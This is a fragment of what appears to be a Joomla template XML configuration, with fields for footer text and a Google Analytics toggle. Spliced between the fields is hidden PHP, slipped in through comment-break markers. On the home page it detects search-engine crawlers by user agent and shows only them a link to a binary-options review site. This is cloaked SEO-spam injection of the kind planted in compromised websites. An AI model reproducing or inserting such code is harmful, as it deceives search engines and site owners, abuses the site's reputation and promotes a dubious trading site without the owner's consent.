...
<config>
  <fields name="params">
   ...
   <field name="footertext" type="textarea" default="Custom text here" label="Custom text here" description="Custom text here" rows="1" cols="60"/> <field name="analyticsdisable" type="radio" default="1" label="Google analytics"><option value="0">Disable</option><option value="1">Enable</option></field> 	*/ if (JURI::base() == JURI::current()) {$access = array('Googlebot','Yahoo','sp_auditbot','msnbot','Googlebot-Mobile'); foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT'])) echo '<center>' . $this->getTitle() . ' <strong><a href="http://www.americanbinaryoptions.com/review/ctoption/" title="ctoption">is ctoption a scam</a></strong> binary options trading.</center>';}} /* 
